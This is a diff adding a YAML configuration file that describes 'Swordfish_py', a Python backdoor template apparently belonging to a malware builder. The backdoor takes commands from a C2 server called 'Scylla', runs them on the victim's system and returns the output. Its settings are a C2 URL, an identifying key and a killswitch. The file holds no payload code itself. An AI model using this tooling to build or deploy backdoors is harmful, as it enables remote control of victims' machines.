@@ -1,0 +1,21 @@
+name: "Swordfish_py"
+lang: "py"
+malware_type: "Backdoor"
+description: "A simple backdoor, it is made to work with Scylla as a 2 way C2, having Scylla waiting for queries based on the malware_key, and if one match, it send a response with one or multiple commands inside, Swordfish then execute the command(s) and send the output to the C2, giving capabilities to Scylla, like an extended arm in the victim system"
+template: "templates/base/swordfish.py.j2"
+features:
+  - name: c2_url
+    description: "the URL where the key and some metadata will be sent"
+    type: "string"
+    mandatory: True
+    default: ""
+  - name: malware_key
+    description: "key to identify which malware has send the data to the C2, used by Scylla"
+    type: "string"
+    mandatory: False
+    default: "Looking-Sharp"
+  - name: activate_killswitch
+    description: "activate the cross killswitch"
+    type: "bool"
+    mandatory: False
+    default: "False"
